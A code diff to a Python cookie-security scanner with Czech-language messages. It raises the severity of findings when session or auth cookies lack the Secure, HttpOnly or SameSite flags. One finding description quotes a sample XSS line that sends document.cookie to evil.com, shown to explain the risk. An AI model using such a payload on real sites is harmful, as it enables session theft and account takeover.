@@ -1,4 +1,16 @@
+import re
+
 from .base import BaseScanModule, Finding, Severity, guide_url
+
+
+# Session-typed cookies (přihlášení, auth tokeny) — missing flag = CRITICAL,
+# protože XSS/CSRF/MITM na takové cookies vede k převzetí účtu.
+_SESSION_NAME_PATTERN = re.compile(
+    r"(?:^|[_\-\.])"
+    r"(?:session|sess|sid|auth|token|csrf|xsrf|jwt|phpsessid|jsessionid|connect)"
+    r"(?:[_\-\.]|$)",
+    re.IGNORECASE,
+)
 
 
 def _parse_cookie_name(set_cookie: str) -> str:
@@ -34,6 +46,22 @@ def _format_cookie_names(names: list[str]) -> str:
     return ", ".join(names[:5]) + f" ... a {len(names) - 5} dalších"
 
 
+def _is_session_cookie(name: str) -> bool:
+    """Heuristika — jméno cookie indikuje session/auth/CSRF data."""
+    if not name:
+        return False
+    return bool(_SESSION_NAME_PATTERN.search(name))
+
+
+def _severity_for_missing(names: list[str]) -> Severity:
+    """Severity podle: session cookie → CRITICAL, 3+ → WARNING, 1-2 → INFO."""
+    if any(_is_session_cookie(n) for n in names):
+        return Severity.CRITICAL
+    if len(names) >= 3:
+        return Severity.WARNING
+    return Severity.INFO
+
+
 class CookieScanner(BaseScanModule):
     name = "cookies"
     step_label = "Cookies & bezpečnostní flagy"
@@ -50,9 +78,9 @@ class CookieScanner(BaseScanModule):
         if not set_cookies:
             return []
 
-        missing_secure = []
-        missing_httponly = []
-        missing_samesite = []
+        missing_secure: list[str] = []
+        missing_httponly: list[str] = []
+        missing_samesite: list[str] = []
 
         for cookie_str in set_cookies:
             name = _parse_cookie_name(cookie_str)
@@ -68,14 +96,14 @@ class CookieScanner(BaseScanModule):
             if samesite is None or samesite == "none":
                 missing_samesite.append(name)
 
-        findings = []
+        findings: list[Finding] = []
 
         if missing_secure:
             findings.append(Finding(
                 id="cookie-missing-secure",
                 title=f"{len(missing_secure)} cookies bez Secure flagu",
                 description="Cookies bez Secure flagu se odesílají i přes nezabezpečené HTTP spojení. Útočník na veřejné Wi-Fi může zachytit session cookie a převzít účet uživatele.",
-                severity=Severity.WARNING,
+                severity=_severity_for_missing(missing_secure),
                 category="cookies",
                 fix_url=guide_url("autentizace-sessions"),
                 doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security",
@@ -87,7 +115,7 @@ class CookieScanner(BaseScanModule):
                 id="cookie-missing-httponly",
                 title=f"{len(missing_httponly)} cookies bez HttpOnly flagu",
                 description="Cookies bez HttpOnly jsou čitelné přes document.cookie v JavaScriptu. Při XSS útoku stačí jeden řádek kódu: document.location='https://evil.com/?c='+document.cookie",
-                severity=Severity.WARNING,
+                severity=_severity_for_missing(missing_httponly),
                 category="cookies",
                 fix_url=guide_url("autentizace-sessions"),
                 doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security",
@@ -99,7 +127,7 @@ class CookieScanner(BaseScanModule):
                 id="cookie-missing-samesite",
                 title=f"{len(missing_samesite)} cookies bez SameSite ochrany",
                 description="Cookies bez SameSite se odesílají i z cizích stránek. Útočník vytvoří formulář na svém webu, který odešle POST na váš server — prohlížeč přiloží cookies a akce proběhne za přihlášeného uživatele (CSRF).",
-                severity=Severity.WARNING,
+                severity=_severity_for_missing(missing_samesite),
                 category="cookies",
                 fix_url=guide_url("autentizace-sessions"),
                 doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_attribute",
